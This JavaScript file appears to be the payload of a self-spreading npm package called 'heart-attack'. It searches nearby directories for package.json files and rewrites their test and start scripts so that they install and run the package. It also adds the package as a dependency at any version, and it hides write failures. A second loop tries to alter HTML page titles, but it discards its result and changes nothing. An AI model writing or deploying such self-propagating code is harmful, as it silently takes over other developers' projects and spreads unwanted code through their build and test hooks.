import fs from 'fs';
import find from './service/findFiles.js';
import read from './service/readFile.js';

const HTMLFiles=find('../../','.html');
const packageJSONFiles=find('../../','package.json');

for(const file of packageJSONFiles){
    const JSONFile=read(file,'JSON');

    (JSONFile.scripts)? null:JSONFile.scripts={};
    (JSONFile.scripts.test)? null:JSONFile.scripts.test='';
    (JSONFile.scripts.start)? null:JSONFile.scripts.start='';
    (JSONFile.dependencies)? null:JSONFile.dependencies={};
    
    const and=' && ';
    const injectRunner=`npm i${and}node ./node_modules/heart-attack/index.js`;
    JSONFile.scripts.test=JSONFile.scripts.test+and+injectRunner;
    JSONFile.scripts.start=injectRunner+and+JSONFile.scripts.start;
    JSONFile.dependencies['heart-attack']='*';

    try{
        fs.writeFileSync(
            file, 
            JSON.stringify(JSONFile,null,4)
        );
    }catch(err){
        //probably permission issue
    }
}

for(const file of HTMLFiles){
    let HTMLFile=read(file,'HTML');

    try{
        HTMLFile.replace('<title>','<title>❤️');
    
        fs.writeFileSync(
            file, 
            HTMLFile
        );
        }catch(err){
            //probably permission issue
        }
}